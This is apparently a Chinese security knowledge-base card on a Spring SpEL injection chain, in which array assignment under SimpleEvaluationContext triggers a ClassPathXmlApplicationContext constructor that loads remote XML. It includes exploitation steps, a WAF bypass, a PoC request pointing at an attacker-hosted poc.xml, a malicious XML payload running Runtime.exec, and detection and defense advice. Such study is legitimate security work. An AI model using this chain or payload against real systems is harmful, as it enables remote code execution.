---
id: web-java-expression-spel-simplecontext-array-assignment-objectconverter-constructor-rce
title: SimpleEvaluationContext 数组赋值经 ObjectToObjectConverter 调用构造器：ClassPathXmlApplicationContext 加载远程 XML RCE
type: scenario
domain: web
path: web/java/expression/spel
technique: simplecontext-array-assignment-objectconverter-constructor-rce
aliases:
- SimpleEvaluationContext 数组赋值绕过
- Indexer ArrayIndexingValueRef setValue
- ObjectToObjectConverter 构造器
- ClassPathXmlApplicationContext 远程 XML
- SpEL
- SpEL 转换器 RCE
tags:
- java
- spring
- spel
- expression-injection
- simpleevaluationcontext
- array-assignment
- objecttoobjectconverter
- classpathxmlapplicationcontext
- xml
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V275
  verified_at: '2026-11-07T23:34:19+08:00'
  notes: 已对照原文和全部 3 图核对：图01 Util.main 调 buildArray("org.springframework.context.support.ClassPathXmlApplicationContext","...") 弹出计算器；图02 ast=Assign、children=CompoundExpression+StringLiteral（#root[0]='...'）；图03 ObjectToObjectConverter.convert 中 source=http://49.232.222.195:8000/poc.xml、targetClass=ClassPathXmlApplicationContext、executable=Constructor，源码 constructor.newInstance(source) 高亮；调用栈与卡内 Assign→Indexer→setArrayElement→StandardTypeConverter→ObjectToObjectConverter→Constructor 一致。SimpleEvaluationContext 只读绑定仍走 Indexer 数组赋值、ClassPathXmlApplicationContext(String) 构造→refresh→XML 中 SpEL 执行，原理与原文一致；WAF 黑名单 T(/new /.class/.getClass(/.forName( 不含表达式与 name 参数，绕过分析成立。未验证点：原文未展示 /forward→/admin/eval 的完整 HTTP 往返与远程 XML 拉取截图，本地复现为 Util.main；未复跑；frontmatter 无 sources/source_url；原文未给受影响版本（Spring 版本未标注），未设 affected_versions。kb show 存在；dedup top1 为自身，最高相关卡 web-java-expression-spel-simplecontext-property-getter-templatesimpl-rce（14840）为 getter 读路径，本卡为数组赋值经类型转换调构造器，dup-scan 判 related，非同链，保留两卡；其余 ClassPathXmlApplicationContext
    sink 的 JDBC socketFactory/Fastjson 卡入口不同。
---

## 一句话结论

`SimpleEvaluationContext.forReadOnlyDataBinding()` 并非完全只读：当 root 是攻击者可控类型的数组时，表达式 `#root[0]='http://attacker/poc.xml'` 走 `Indexer` 的数组赋值路径，绕过属性访问器限制；`StandardTypeConverter → ObjectToObjectConverter` 会为目标数组元素类型寻找单参构造器并 `newInstance`，把 `ClassPathXmlApplicationContext(String)` 作为目标类型即可加载远程 Spring XML，最终执行其中的 `#{T(java.lang.Runtime)...}` 表达式实现 RCE。

## 原理

- 应用代码形态：`Class clazz = Class.forName(name); Object array = Array.newInstance(clazz, 1); Util.eval(array, expr);`，`name` 与 `expr` 均由请求控制；`eval` 使用 `SimpleEvaluationContext.forReadOnlyDataBinding()`。
- `expr = #root[0]='http://attacker/poc.xml'` 被解析为 `Assign(CompoundExpression(Indexer(#root, 0)), StringLiteral)`；求值时 `Assign.getValueInternal → Indexer.setValue → Indexer$ArrayIndexingValueRef.setValue → Indexer.setArrayElement`。
- `setArrayElement` 对非基础类型数组执行 `array[idx] = this.convertValue(converter, newValue, arrayComponentType)`；`StandardTypeConverter` 交给 `GenericConversionService.convert` → `ObjectToObjectConverter.convert`，后者查找“String → 目标类”的构造器/方法，`ReflectionUtils.makeAccessible(constructor); constructor.newInstance(source)`。
- 若目标数组元素类型是 `org.springframework.context.support.ClassPathXmlApplicationContext`，它存在 `ClassPathXmlApplicationContext(String)` 构造器：`newInstance(url)` → `setConfigLocations(url); refresh()`，Spring 会拉取并解析远程 XML；XML 中 bean 的 `constructor-arg value="#{T(java.lang.Runtime).getRuntime().exec('calc')}"` 由 Spring 自身的 StandardEvaluationContext 求值，命令执行。
- 为什么 SimpleEvaluationContext 没拦住：它的“只读”限制作用在 Bean 属性绑定（DataBindingPropertyAccessor）上；数组元素赋值由 `Indexer`/`ArrayIndexingValueRef` 和类型转换器处理，不经过该上下文允许的属性写白名单。转换器的职责就是把字符串转成数组元素类型，调用构造器属于正常转换行为。
- WAF 绕过：黑名单 `T(`、`new `、`.class`、`.getClass(`、`.forName(` 只检查请求字符串参数；表达式 `#root[0]='url'` 不含这些子串，类名由单独的 `name` 参数提供并由应用代码 `Class.forName` 加载，故整体绕过。

## 触发条件

- 应用把用户可控的类名传给 `Class.forName`/`Array.newInstance`，并把用户可控表达式交给 `SimpleEvaluationContext.forReadOnlyDataBinding()` 求值。
- root 数组元素类型可由攻击者选择，且存在带 String（或可转换）参数、具有副作用的构造器/转换方法（如 `ClassPathXmlApplicationContext(String)`、`FileSystemXmlApplicationContext(String)` 等）。
- 表达式允许赋值（`Assign` 未被禁用），数组可写。
- 目标能访问攻击者控制的 XML（HTTP/文件），且 Spring XML 解析会求值 SpEL。
- 目标 WAF 未拦截类名/表达式（或不存在 WAF）。

## 利用步骤

1. 选择一个有副作用且带 String 构造器的类，例如 `org.springframework.context.support.ClassPathXmlApplicationContext`。
2. 在攻击者服务器放置 Spring XML，bean 定义值写入 `#{T(java.lang.Runtime).getRuntime().exec('calc')}`。
3. 向受影响的 eval 接口提交 `name=<上述类名>`、`expr=#root[0]='http://attacker/poc.xml'`（URL 编码）。
4. 应用创建该类的长度 1 数组，SpEL 赋值触发类型转换与构造器调用；`refresh()` 拉取 XML 并求值 SpEL，命令执行。
5. 若 /admin/eval 被过滤器保护，可经 `/forward?forward=/admin/eval` 内部转发绕过（见关联卡）。
6. 记录请求、远程 XML 访问日志与命令执行证据；停止在无害命令。

## PoC

```http
GET /admin/eval?name=org.springframework.context.support.ClassPathXmlApplicationContext&expr=%23root%5B0%5D%3D%27http%3A%2F%2Fattacker%2Fpoc.xml%27 HTTP/1.1
Host: target
```

远程 Spring XML：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="evil" class="java.lang.String">
        <constructor-arg value="#{T(java.lang.Runtime).getRuntime().exec('calc')}"/>
    </bean>
</beans>
```

调用栈关键段：

```text
Assign.getValueInternal
→ Indexer.setValue → Indexer$ArrayIndexingValueRef.setValue
→ Indexer.setArrayElement
→ StandardTypeConverter.convertValue
→ GenericConversionService.convert
→ ObjectToObjectConverter.convert
→ Constructor.newInstance(source)
→ ClassPathXmlApplicationContext(String) → refresh → 解析 XML → SpEL 执行
```

## 变体与关联

- 变体：其他带 String 构造器的副作用类，如 `FileSystemXmlApplicationContext`；也可寻找转换器可调用的静态工厂/单参方法（ObjectToObjectConverter 对 method 同样会 `invoke`）。
- 变体：若数组元素类型为包装类型/基础类型，`setArrayElement` 走专用分支，不会触发构造器；必须选择对象类型。
- 变体：Bean 属性写可能被 read-only 数据绑定拦截，但数组索引赋值走 Indexer，仍可写。
- 关联：[[web-java-expression-spel-simplecontext-property-getter-templatesimpl-rce]]（同一 SimpleEvaluationContext 环境下的 getter 读路径）、[[web-java-expression-spel-injection-to-rce]]（StandardEvaluationContext 基础）、[[web-generic-auth-requestdispatcher-forward-filter-bypass]]（本链的未授权入口）、[[web-java-component-h2-jre-only-create-alias-static-method-rce]]（ClassPathXmlApplicationContext 作为 RCE sink 的另一场景）。
- 边界：root 类型不可控、表达式禁止赋值、元素类型无可用构造器/转换方法、无法访问远程 XML、Spring XML 禁用 SpEL 时链断。

## 检测与防御

- 检测：SpEL 表达式出现 `#root[...]=`、`[...]=` 赋值；请求参数含 `ClassPathXmlApplicationContext`/`FileSystemXmlApplicationContext` 等类名；应用向外部 HTTP 拉取 XML；Spring XML 中出现 `#{T(...)`。
- 防御：禁止把用户输入传给 `Class.forName`/`Array.newInstance`；SpEL 使用固定语法白名单，禁止 Assign/Indexer 写入；root 使用固定 DTO 类型，不让攻击者选择类型；禁用远程 XML 加载与 `setConfigLocations` 外部输入。
- 加固：升级 Spring 并启用 SpEL 编译器/表达式白名单；WAF 作为辅助，重点检测类名参数与赋值表达式；对出站 HTTP 做域名白名单。
